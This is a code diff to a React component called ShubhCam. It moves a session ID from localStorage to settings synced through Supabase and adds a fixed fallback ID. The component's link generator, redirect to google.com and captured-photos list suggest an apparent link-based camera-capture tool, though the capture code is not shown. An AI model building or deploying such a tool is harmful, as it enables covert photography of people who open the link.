@@ -5,6 +5,7 @@ import { Input } from "./ui/input";
 import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
 import { supabase } from "@/integrations/supabase/client";
+import { useSettings } from "@/contexts/SettingsContext";
 
 interface CapturedPhoto {
   id: string;
@@ -14,21 +15,14 @@ interface CapturedPhoto {
 }
 
 const ShubhCam = () => {
+  const { settings, updateSettings } = useSettings();
   const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
   const [redirectUrl, setRedirectUrl] = useState("https://google.com");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [loading, setLoading] = useState(false);
   
-  // Persist session ID in localStorage so it survives page refresh
-  const [sessionId, setSessionId] = useState(() => {
-    const savedSessionId = localStorage.getItem('shubhcam_session_id');
-    if (savedSessionId) {
-      return savedSessionId;
-    }
-    const newSessionId = Math.random().toString(36).substring(2, 10);
-    localStorage.setItem('shubhcam_session_id', newSessionId);
-    return newSessionId;
-  });
+  // Use session ID from settings (synced across all devices via Supabase)
+  const sessionId = settings.camSessionId || "shubhcam01";
 
   // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
@@ -70,12 +64,11 @@ const ShubhCam = () => {
 
   const generateNewSession = () => {
     const newSessionId = Math.random().toString(36).substring(2, 10);
-    localStorage.setItem('shubhcam_session_id', newSessionId);
-    setSessionId(newSessionId);
+    updateSettings({ camSessionId: newSessionId });
     setPhotos([]);
     toast({
       title: "New Session Created",
-      description: `Session ID: ${newSessionId}`,
+      description: `Session ID: ${newSessionId} (synced across all devices)`,
     });
   };
 
